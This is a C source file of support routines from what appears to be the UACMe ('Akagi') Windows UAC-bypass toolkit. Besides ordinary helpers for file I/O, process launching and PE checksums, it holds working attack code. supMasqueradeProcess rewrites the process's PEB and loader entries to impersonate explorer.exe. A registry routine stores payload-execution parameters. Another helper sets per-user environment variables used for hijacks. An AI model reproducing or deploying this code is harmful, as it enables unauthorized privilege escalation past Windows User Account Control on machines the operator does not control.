/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2015 - 2017
*
*  TITLE:       SUP.C
*
*  VERSION:     2.72
*
*  DATE:        26 May 2017
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

/*
* supHeapAlloc
*
* Purpose:
*
* Wrapper for RtlAllocateHeap with ucmHeap.
*
*/
PVOID FORCEINLINE supHeapAlloc(
    _In_ SIZE_T Size)
{
    return RtlAllocateHeap(g_ctx.ucmHeap, HEAP_ZERO_MEMORY, Size);
}

/*
* supHeapFree
*
* Purpose:
*
* Wrapper for RtlFreeHeap with ucmHeap.
*
*/
BOOL FORCEINLINE supHeapFree(
    _In_ PVOID Memory)
{
    return RtlFreeHeap(g_ctx.ucmHeap, 0, Memory);
}

/*
* supIsProcess32bit
*
* Purpose:
*
* Return TRUE if given process is under WOW64, FALSE otherwise.
*
*/
BOOLEAN supIsProcess32bit(
    _In_ HANDLE hProcess
)
{
    NTSTATUS status;
    PROCESS_EXTENDED_BASIC_INFORMATION pebi;

    if (hProcess == NULL) {
        return FALSE;
    }

    //query if this is wow64 process
    RtlSecureZeroMemory(&pebi, sizeof(pebi));
    pebi.Size = sizeof(PROCESS_EXTENDED_BASIC_INFORMATION);
    status = NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pebi, sizeof(pebi), NULL);
    if (NT_SUCCESS(status)) {
        return (pebi.IsWow64Process == 1);
    }
    return FALSE;
}

/*
* supGetElevationType
*
* Purpose:
*
* Returns client elevation type.
*
*/
BOOL supGetElevationType(
    TOKEN_ELEVATION_TYPE *lpType
)
{
    HANDLE hToken = NULL;
    NTSTATUS status;
    ULONG bytesRead = 0;

    if (lpType == NULL) {
        return FALSE;
    }

    status = NtOpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken);
    if (!NT_SUCCESS(status)) {
        SetLastError(RtlNtStatusToDosError(status));
        return FALSE;
    }

    status = NtQueryInformationToken(hToken, TokenElevationType, lpType,
        sizeof(TOKEN_ELEVATION_TYPE), &bytesRead);

    SetLastError(RtlNtStatusToDosError(status));

    NtClose(hToken);

    return (NT_SUCCESS(status));
}

/*
* supWriteBufferToFile
*
* Purpose:
*
* Create new file and write buffer to it.
*
*/
BOOL supWriteBufferToFile(
    _In_ LPWSTR lpFileName,
    _In_ PVOID Buffer,
    _In_ DWORD BufferSize
)
{
    HANDLE hFile;
    DWORD bytesIO;

    if (
        (lpFileName == NULL) ||
        (Buffer == NULL) ||
        (BufferSize == 0)
        )
    {
        return FALSE;
    }

    hFile = CreateFile(lpFileName,
        GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);

    if (hFile == INVALID_HANDLE_VALUE) {
        supDebugPrint(TEXT("CreateFile"), GetLastError());
        return FALSE;
    }

    WriteFile(hFile, Buffer, BufferSize, &bytesIO, NULL);
    CloseHandle(hFile);

    return (bytesIO == BufferSize);
}

/*
* supDebugPrint
*
* Purpose:
*
* Write formatted debug output.
*
*/
VOID supDebugPrint(
    LPWSTR ApiName,
    DWORD status
)
{
    LPWSTR lpBuffer;
    SIZE_T sz;

    sz = MAX_PATH;
    if (ApiName)
        sz += _strlen(ApiName);

    lpBuffer = supHeapAlloc(sz * sizeof(WCHAR));
    if (lpBuffer) {
        _strcpy(lpBuffer, TEXT("[UCM] "));
        if (ApiName) {
            _strcat(lpBuffer, ApiName);
        }
        _strcat(lpBuffer, TEXT(" code = "));
        ultostr(status, _strend(lpBuffer));
        _strcat(lpBuffer, TEXT("\n"));
        OutputDebugString(lpBuffer);
        supHeapFree(lpBuffer);
    }

    SetLastError(status);
}

/*
* supReadFileToBuffer
*
* Purpose:
*
* Read file to buffer. Release memory when it no longer needed.
*
*/
PBYTE supReadFileToBuffer(
    _In_ LPWSTR lpFileName,
    _Inout_opt_ LPDWORD lpBufferSize
)
{
    BOOL        bCond = FALSE;
    NTSTATUS    status;
    HANDLE      hFile = NULL, hRoot = NULL;
    PBYTE       Buffer = NULL;
    SIZE_T      sz = 0;

    UNICODE_STRING              usName;
    OBJECT_ATTRIBUTES           attr;
    IO_STATUS_BLOCK             iost;
    FILE_STANDARD_INFORMATION   fi;

    do {

        RtlSecureZeroMemory(&usName, sizeof(usName));

        if (lpFileName == NULL)
            return NULL;

        if (!RtlDosPathNameToNtPathName_U(
            NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath.Buffer, &usName, NULL, NULL))
        {
            break;
        }

        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, 0, NULL);
        status = NtCreateFile(&hRoot, FILE_LIST_DIRECTORY | SYNCHRONIZE,
            &attr,
            &iost,
            NULL,
            0,
            FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
            FILE_OPEN,
            FILE_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        RtlFreeUnicodeString(&usName);

        if (!NT_SUCCESS(status)) {
            supDebugPrint(TEXT("OpenDirectory"), RtlNtStatusToDosError(status));
            break;
        }

        RtlInitUnicodeString(&usName, lpFileName);
        InitializeObjectAttributes(&attr, &usName, OBJ_CASE_INSENSITIVE, hRoot, NULL);

        status = NtCreateFile(&hFile,
            FILE_READ_DATA | SYNCHRONIZE,
            &attr,
            &iost,
            NULL,
            FILE_ATTRIBUTE_NORMAL,
            FILE_SHARE_READ,
            FILE_OPEN,
            FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
            NULL,
            0
        );

        if (!NT_SUCCESS(status)) {
            supDebugPrint(TEXT("CreateFile"), RtlNtStatusToDosError(status));
            break;
        }

        RtlSecureZeroMemory(&fi, sizeof(fi));
        status = NtQueryInformationFile(hFile, &iost, &fi, sizeof(FILE_STANDARD_INFORMATION), FileStandardInformation);
        if (!NT_SUCCESS(status))
            break;

        sz = (SIZE_T)fi.EndOfFile.LowPart;
        status = NtAllocateVirtualMemory(NtCurrentProcess(), &Buffer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (NT_SUCCESS(status)) {

            status = NtReadFile(hFile, NULL, NULL, NULL, &iost, Buffer, fi.EndOfFile.LowPart, NULL, NULL);
            if (NT_SUCCESS(status)) {
                if (lpBufferSize)
                    *lpBufferSize = fi.EndOfFile.LowPart;
            }
            else {
                sz = 0;
                NtFreeVirtualMemory(NtCurrentProcess(), &Buffer, &sz, MEM_RELEASE);
                Buffer = NULL;
            }
        }

    } while (bCond);

    if (hRoot != NULL) {
        NtClose(hRoot);
    }

    if (hFile != NULL) {
        NtClose(hFile);
    }

    return Buffer;
}

/*
* supRunProcess2
*
* Purpose:
*
* Execute given process with given parameters and wait if specified.
*
*/
BOOL supRunProcess2(
    _In_ LPWSTR lpszProcessName,
    _In_opt_ LPWSTR lpszParameters,
    _In_ BOOL fWait
)
{
    BOOL bResult;
    SHELLEXECUTEINFOW shinfo;
    RtlSecureZeroMemory(&shinfo, sizeof(shinfo));

    if (lpszProcessName == NULL)
        return FALSE;

    shinfo.cbSize = sizeof(shinfo);
    shinfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shinfo.lpFile = lpszProcessName;
    shinfo.lpParameters = lpszParameters;
    shinfo.lpDirectory = NULL;
    shinfo.nShow = SW_SHOW;
    bResult = ShellExecuteExW(&shinfo);
    if (bResult) {
        if (fWait)
            WaitForSingleObject(shinfo.hProcess, 0x8000);
        CloseHandle(shinfo.hProcess);
    }
    return bResult;
}

/*
* supRunProcess
*
* Purpose:
*
* Execute given process with given parameters.
*
*/
BOOL supRunProcess(
    _In_ LPWSTR lpszProcessName,
    _In_opt_ LPWSTR lpszParameters
)
{
    return supRunProcess2(lpszProcessName, lpszParameters, TRUE);
}

/*
* supRunProcessEx
*
* Purpose:
*
* Start new process in suspended state.
*
*/
HANDLE NTAPI supRunProcessEx(
    _In_ LPWSTR lpszParameters,
    _In_opt_ LPWSTR lpCurrentDirectory,
    _Out_opt_ HANDLE *PrimaryThread,
    _Inout_opt_ LPWSTR lpApplicationName
)
{
    BOOL bResult = FALSE;
    LPWSTR pszBuffer = NULL;
    SIZE_T ccb;
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    DWORD dwFlags = CREATE_DEFAULT_ERROR_MODE | NORMAL_PRIORITY_CLASS;

    if (PrimaryThread)
        *PrimaryThread = NULL;

    if (lpszParameters == NULL)
        return NULL;

    ccb = (1 + _strlen(lpszParameters)) * sizeof(WCHAR);
    pszBuffer = supHeapAlloc(ccb);
    if (pszBuffer == NULL)
        return NULL;

    _strcpy(pszBuffer, lpszParameters);

    RtlSecureZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    RtlSecureZeroMemory(&si, sizeof(STARTUPINFO));
    si.cb = sizeof(STARTUPINFO);
    GetStartupInfo(&si);

    bResult = CreateProcessAsUser(
        NULL,
        lpApplicationName,
        pszBuffer,
        NULL,
        NULL,
        FALSE,
        dwFlags | CREATE_SUSPENDED,
        NULL,
        lpCurrentDirectory,
        &si,
        &pi);

    if (bResult) {
        if (PrimaryThread) {
            *PrimaryThread = pi.hThread;
        }
        else {
            CloseHandle(pi.hThread);
        }
    }
    supHeapFree(pszBuffer);
    return pi.hProcess;
}

/*
* supCopyMemory
*
* Purpose:
*
* Copies bytes between buffers.
*
* dest - Destination buffer
* cbdest - Destination buffer size in bytes
* src - Source buffer
* cbsrc - Source buffer size in bytes
*
*/
void supCopyMemory(
    _Inout_ void *dest,
    _In_ size_t cbdest,
    _In_ const void *src,
    _In_ size_t cbsrc
)
{
    char *d = (char*)dest;
    char *s = (char*)src;

    if ((dest == 0) || (src == 0) || (cbdest == 0))
        return;
    if (cbdest < cbsrc)
        cbsrc = cbdest;

    while (cbsrc > 0) {
        *d++ = *s++;
        cbsrc--;
    }
}

/*
* supQueryEntryPointRVA
*
* Purpose:
*
* Return EP RVA of the given PE file.
*
*/
DWORD supQueryEntryPointRVA(
    _In_ LPWSTR lpImageFile
)
{
    PVOID                       ImageBase;
    PIMAGE_DOS_HEADER           pdosh;
    PIMAGE_FILE_HEADER          pfh1;
    PIMAGE_OPTIONAL_HEADER      poh;
    DWORD                       epRVA = 0;

    if (lpImageFile == NULL) {
        return 0;
    }

    ImageBase = LoadLibraryExW(lpImageFile, 0, DONT_RESOLVE_DLL_REFERENCES);
    if (ImageBase) {

        pdosh = (PIMAGE_DOS_HEADER)ImageBase;
        pfh1 = (PIMAGE_FILE_HEADER)((ULONG_PTR)ImageBase + (pdosh->e_lfanew + sizeof(DWORD)));
        poh = (PIMAGE_OPTIONAL_HEADER)((ULONG_PTR)pfh1 + sizeof(IMAGE_FILE_HEADER));

        //AddressOfEntryPoint is in standard fields.
        epRVA = poh->AddressOfEntryPoint;

        FreeLibrary(ImageBase);
    }
    return epRVA;
}

/*
* supQueryEnvironmentVariableOffset
*
* Purpose:
*
* Return offset to the given environment variable.
*
*/
LPWSTR supQueryEnvironmentVariableOffset(
    _In_ PUNICODE_STRING Value
)
{
    UNICODE_STRING   str1;
    PWCHAR           EnvironmentBlock, ptr;

    EnvironmentBlock = RtlGetCurrentPeb()->ProcessParameters->Environment;
    ptr = EnvironmentBlock;

    do {
        if (*ptr == 0)
            return 0;

        RtlSecureZeroMemory(&str1, sizeof(str1));
        RtlInitUnicodeString(&str1, ptr);
        if (RtlPrefixUnicodeString(Value, &str1, TRUE))
            break;

        ptr += _strlen(ptr) + 1;

    } while (1);

    return (ptr + Value->Length / sizeof(WCHAR));
}

/*
* supSetParameter
*
* Purpose:
*
* Set parameter for payload execution.
*
*/
BOOL supSetParameter(
    LPWSTR lpParameter,
    DWORD cbParameter
)
{
    BOOL cond = FALSE, bResult = FALSE;
    HKEY hKey;
    LRESULT lRet;

    hKey = NULL;

    do {
        lRet = RegCreateKeyExW(HKEY_CURRENT_USER, T_AKAGI_KEY, 0, NULL,
            REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, NULL);

        if ((lRet != ERROR_SUCCESS) || (hKey == NULL)) {
            break;
        }

        RegSetValueExW(hKey, T_AKAGI_FLAG, 0, REG_DWORD, (BYTE *)&g_ctx.AkagiFlag, sizeof(DWORD));

        lRet = RegSetValueExW(hKey, T_AKAGI_PARAM, 0, REG_SZ,
            (LPBYTE)lpParameter, cbParameter);

        bResult = (lRet == ERROR_SUCCESS);

    } while (cond);

    if (hKey) {
        RegCloseKey(hKey);
    }

    return bResult;
}

/*
* supChkSum
*
* Purpose:
*
* Calculate partial checksum for given buffer.
*
*/
USHORT supChkSum(
    ULONG PartialSum,
    PUSHORT Source,
    ULONG Length
)
{
    while (Length--) {
        PartialSum += *Source++;
        PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);
    }
    return (USHORT)(((PartialSum >> 16) + PartialSum) & 0xffff);
}

/*
* supCalculateCheckSumForMappedFile
*
* Purpose:
*
* Calculate PE file checksum.
*
*/
DWORD supCalculateCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
)
{
    PUSHORT AdjustSum;
    PIMAGE_NT_HEADERS NtHeaders;
    USHORT PartialSum;
    ULONG CheckSum;

    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders != NULL) {
        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
        PartialSum -= (PartialSum < AdjustSum[0]);
        PartialSum -= AdjustSum[0];
        PartialSum -= (PartialSum < AdjustSum[1]);
        PartialSum -= AdjustSum[1];
    }
    else
    {
        PartialSum = 0;
    }
    CheckSum = (ULONG)PartialSum + FileLength;
    return CheckSum;
}

/*
* supVerifyMappedImageMatchesChecksum
*
* Purpose:
*
* Calculate PE file checksum and compare it with checksum in PE header.
*
*/
BOOLEAN supVerifyMappedImageMatchesChecksum(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
)
{
    PIMAGE_NT_HEADERS NtHeaders;
    ULONG HeaderSum;
    ULONG CheckSum;

    CheckSum = supCalculateCheckSumForMappedFile(BaseAddress, FileLength);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders) {
        HeaderSum = NtHeaders->OptionalHeader.CheckSum;
    }
    else {
        HeaderSum = FileLength;
    }
    return (CheckSum == HeaderSum);
}

/*
* supSetCheckSumForMappedFile
*
* Purpose:
*
* Set checksum value to PE header.
*
*/
BOOLEAN supSetCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG CheckSum
)
{
    PIMAGE_NT_HEADERS NtHeaders;

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders) {
        NtHeaders->OptionalHeader.CheckSum = CheckSum;
        return TRUE;
    }
    return FALSE;
}

/*
* ucmShowMessage
*
* Purpose:
*
* Output message to user.
*
*/
VOID ucmShowMessage(
    LPWSTR lpszMsg
)
{
    if (lpszMsg) {
        MessageBoxW(GetDesktopWindow(),
            lpszMsg, PROGRAMTITLE, MB_ICONINFORMATION);
    }
}

/*
* ucmShowQuestion
*
* Purpose:
*
* Output message with question to user.
*
*/
INT ucmShowQuestion(
    LPWSTR lpszMsg
)
{
    return MessageBoxW(GetDesktopWindow(), lpszMsg, PROGRAMTITLE, MB_YESNO);
}

/*
* supLdrQueryResourceData
*
* Purpose:
*
* Load resource by given id (win32 FindResource, SizeofResource, LockResource).
*
*/
PBYTE supLdrQueryResourceData(
    _In_ ULONG_PTR ResourceId,
    _In_ PVOID DllHandle,
    _In_ PULONG DataSize
)
{
    NTSTATUS                   status;
    ULONG_PTR                  IdPath[3];
    IMAGE_RESOURCE_DATA_ENTRY  *DataEntry;
    PBYTE                      Data = NULL;
    ULONG                      SizeOfData = 0;

    if (DllHandle != NULL) {

        IdPath[0] = (ULONG_PTR)RT_RCDATA; //type
        IdPath[1] = ResourceId;           //id
        IdPath[2] = 0;                    //lang

        status = LdrFindResource_U(DllHandle, (ULONG_PTR*)&IdPath, 3, &DataEntry);
        if (NT_SUCCESS(status)) {
            status = LdrAccessResource(DllHandle, DataEntry, &Data, &SizeOfData);
            if (NT_SUCCESS(status)) {
                if (DataSize) {
                    *DataSize = SizeOfData;
                }
            }
        }
    }
    return Data;
}

static LPWSTR g_lpszExplorer = NULL;

/*
* supxLdrEnumModulesCallback
*
* Purpose:
*
* LdrEnumerateLoadedModules callback.
*
*/
VOID NTAPI supxLdrEnumModulesCallback(
    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_ PVOID Context,
    _In_ OUT BOOLEAN *StopEnumeration
)
{
    PPEB Peb = (PPEB)Context;

    if (DataTableEntry->DllBase == Peb->ImageBaseAddress) {
        RtlInitUnicodeString(&DataTableEntry->FullDllName, g_lpszExplorer);
        RtlInitUnicodeString(&DataTableEntry->BaseDllName, EXPLORER_EXE);
        *StopEnumeration = TRUE;
    }
    else {
        *StopEnumeration = FALSE;
    }
}

/*
* supMasqueradeProcess
*
* Purpose:
*
* Fake current process information.
* As in fact Windows only cares about loader entry information as they use PSAPI like bullshit.
*
*/
VOID supMasqueradeProcess(
    VOID
)
{
    DWORD   cch;
    PPEB    Peb = NtCurrentPeb();
    SIZE_T  sz;
    WCHAR   szBuffer[MAX_PATH * 2];

    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
    cch = GetWindowsDirectory(szBuffer, MAX_PATH);
    if ((cch != 0) && (cch < MAX_PATH)) {

        _strcat(szBuffer, L"\\");
        _strcat(szBuffer, EXPLORER_EXE);

        g_lpszExplorer = NULL;
        sz = 0x1000;
        NtAllocateVirtualMemory(NtCurrentProcess(), &g_lpszExplorer, 0, &sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (g_lpszExplorer) {
            _strcpy(g_lpszExplorer, szBuffer);

            RtlEnterCriticalSection(Peb->FastPebLock);

            RtlInitUnicodeString(&Peb->ProcessParameters->ImagePathName, g_lpszExplorer);
            RtlInitUnicodeString(&Peb->ProcessParameters->CommandLine, APPCMDLINE);

            RtlLeaveCriticalSection(Peb->FastPebLock);

            LdrEnumerateLoadedModules(0, &supxLdrEnumModulesCallback, (PVOID)Peb);
        }
    }
}

/*
* supExpandEnvironmentStrings
*
* Purpose:
*
* Native ExpandEnvironmetStrings.
*
*/
DWORD supExpandEnvironmentStrings(
    LPCWSTR lpSrc,
    LPWSTR lpDst,
    DWORD nSize
)
{
    NTSTATUS Status;
    UNICODE_STRING Source, Destination;
    ULONG Length;
    DWORD iSize;

    if (nSize > (MAXUSHORT >> 1) - 2) {
        iSize = (MAXUSHORT >> 1) - 2;
    }
    else {
        iSize = nSize;
    }

    RtlSecureZeroMemory(&Source, sizeof(Source));
    RtlInitUnicodeString(&Source, lpSrc);
    Destination.Buffer = lpDst;
    Destination.Length = 0;
    Destination.MaximumLength = (USHORT)(iSize * sizeof(WCHAR));
    Length = 0;
    Status = RtlExpandEnvironmentStrings_U(NULL,
        &Source,
        &Destination,
        &Length
    );
    if (NT_SUCCESS(Status) || Status == STATUS_BUFFER_TOO_SMALL) {
        return(Length / sizeof(WCHAR));
    }
    else {
        RtlSetLastWin32Error(RtlNtStatusToDosError(Status));
        return 0;
    }
}

/*
* sxsFilePathNoSlash
*
* Purpose:
*
* same as _filepath except it doesnt return last slash.
*
*/
wchar_t *sxsFilePathNoSlash(
    const wchar_t *fname,
    wchar_t *fpath
)
{
    wchar_t *p = (wchar_t *)fname, *p0 = (wchar_t*)fname, *p1 = (wchar_t*)fpath;

    if ((fname == 0) || (fpath == NULL))
        return 0;

    while (*fname != (wchar_t)0) {
        if (*fname == '\\')
            p = (wchar_t *)fname;
        fname++;
    }

    while (p0 < p) {
        *p1 = *p0;
        p1++;
        p0++;
    }
    *p1 = 0;

    return fpath;
}

/*
* sxsFindDllCallback
*
* Purpose:
*
* LdrEnumerateLoadedModules callback used to lookup sxs dlls from loader list.
*
*/
VOID NTAPI sxsFindDllCallback(
    _In_ PCLDR_DATA_TABLE_ENTRY DataTableEntry,
    _In_ PVOID Context,
    _In_ OUT BOOLEAN *StopEnumeration
)
{
    BOOL bCond = FALSE;
    BOOLEAN bFound = FALSE;
    PSXS_SEARCH_CONTEXT sctx = (PSXS_SEARCH_CONTEXT)Context;

    do {

        if ((sctx == NULL) || (DataTableEntry == NULL))
            break;

        if ((DataTableEntry->BaseDllName.Buffer == NULL) ||
            (DataTableEntry->FullDllName.Buffer == NULL))
            break;

        if (_strcmpi(DataTableEntry->BaseDllName.Buffer, sctx->DllName) != 0)
            break;

        if (_strstri(DataTableEntry->FullDllName.Buffer, sctx->PartialPath) == NULL)
            break;

        if (sxsFilePathNoSlash(DataTableEntry->FullDllName.Buffer, sctx->FullDllPath) == NULL)
            break;

        bFound = TRUE;

    } while (bCond);

    *StopEnumeration = bFound;
}

/*
* supNativeGetProcAddress
*
* Purpose:
*
* Simplified native GetProcAddress.
*
*/
PVOID supNativeGetProcAddress(
    WCHAR *Module,
    CHAR *Routine
)
{
    PVOID            DllImageBase = NULL, ProcedureAddress = NULL;
    UNICODE_STRING   DllName;
    ANSI_STRING      str;

    RtlSecureZeroMemory(&DllName, sizeof(DllName));
    RtlInitUnicodeString(&DllName, Module);
    if (!NT_SUCCESS(LdrGetDllHandle(NULL, NULL, &DllName, &DllImageBase)))
        return NULL;

    RtlInitString(&str, Routine);
    if (!NT_SUCCESS(LdrGetProcedureAddress(DllImageBase, &str, 0, &ProcedureAddress)))
        return NULL;

    return ProcedureAddress;
}

/*
* supxDeleteKeyRecursive
*
* Purpose:
*
* Delete key and all it subkeys/values.
*
*/
BOOL supxDeleteKeyRecursive(
    _In_ HKEY hKeyRoot,
    _In_ LPWSTR lpSubKey)
{
    LPWSTR lpEnd;
    LONG lResult;
    DWORD dwSize;
    WCHAR szName[MAX_PATH + 1];
    HKEY hKey;
    FILETIME ftWrite;

    //
    // Attempt to delete key as is.
    //
    lResult = RegDeleteKey(hKeyRoot, lpSubKey);
    if (lResult == ERROR_SUCCESS)
        return TRUE;

    //
    // Try to open key to check if it exist.
    //
    lResult = RegOpenKeyEx(hKeyRoot, lpSubKey, 0, KEY_READ, &hKey);
    if (lResult != ERROR_SUCCESS) {
        if (lResult == ERROR_FILE_NOT_FOUND)
            return TRUE;
        else
            return FALSE;
    }

    //
    // Add slash to the key path if not present.
    //
    lpEnd = _strend(lpSubKey);
    if (*(lpEnd - 1) != TEXT('\\')) {
        *lpEnd = TEXT('\\');
        lpEnd++;
        *lpEnd = TEXT('\0');
    }

    //
    // Enumerate subkeys and call this func for each.
    //
    dwSize = MAX_PATH;
    lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
        NULL, NULL, &ftWrite);

    if (lResult == ERROR_SUCCESS) {

        do {

            _strncpy(lpEnd, MAX_PATH, szName, MAX_PATH);

            if (!supxDeleteKeyRecursive(hKeyRoot, lpSubKey))
                break;

            dwSize = MAX_PATH;

            lResult = RegEnumKeyEx(hKey, 0, szName, &dwSize, NULL,
                NULL, NULL, &ftWrite);

        } while (lResult == ERROR_SUCCESS);
    }

    lpEnd--;
    *lpEnd = TEXT('\0');

    RegCloseKey(hKey);

    //
    // Delete current key, all it subkeys should be already removed.
    //
    lResult = RegDeleteKey(hKeyRoot, lpSubKey);
    if (lResult == ERROR_SUCCESS)
        return TRUE;

    return FALSE;
}

/*
* supDeleteKeyRecursive
*
* Purpose:
*
* Delete key and all it subkeys/values.
*
* Remark:
*
* SubKey should not be longer than 260 chars.
*
*/
BOOL supDeleteKeyRecursive(
    _In_ HKEY hKeyRoot,
    _In_ LPWSTR lpSubKey)
{
    WCHAR szKeyName[MAX_PATH * 2];
    RtlSecureZeroMemory(szKeyName, sizeof(szKeyName));
    _strncpy(szKeyName, MAX_PATH * 2, lpSubKey, MAX_PATH);
    return supxDeleteKeyRecursive(hKeyRoot, szKeyName);
}

/*
* supSetEnvVariable
*
* Purpose:
*
* Remove or set current user environment variable.
*
*/
BOOL supSetEnvVariable(
    _In_ BOOL fRemove,
    _In_ LPWSTR lpVariableName,
    _In_opt_ LPWSTR lpVariableData
)
{
    BOOL	bResult = FALSE, bCond = FALSE;
    HKEY    hKey = NULL;
    DWORD   cbData;

    do {
        if (lpVariableName == NULL)
            break;

        if ((lpVariableData == NULL) && (fRemove == FALSE))
            break;

        if (RegOpenKey(HKEY_CURRENT_USER, L"Environment", &hKey) != ERROR_SUCCESS)
            break;

        if (fRemove) {
            RegDeleteValue(hKey, lpVariableName);
        }
        else {
            cbData = (DWORD)((1 + _strlen(lpVariableData)) * sizeof(WCHAR));
            if (RegSetValueEx(hKey, lpVariableName, 0, REG_SZ,
                (BYTE*)lpVariableData, cbData) != ERROR_SUCCESS)
            {
                break;
            }
        }
        bResult = TRUE;

    } while (bCond);

    if (hKey != NULL)
        RegCloseKey(hKey);

    return bResult;
}
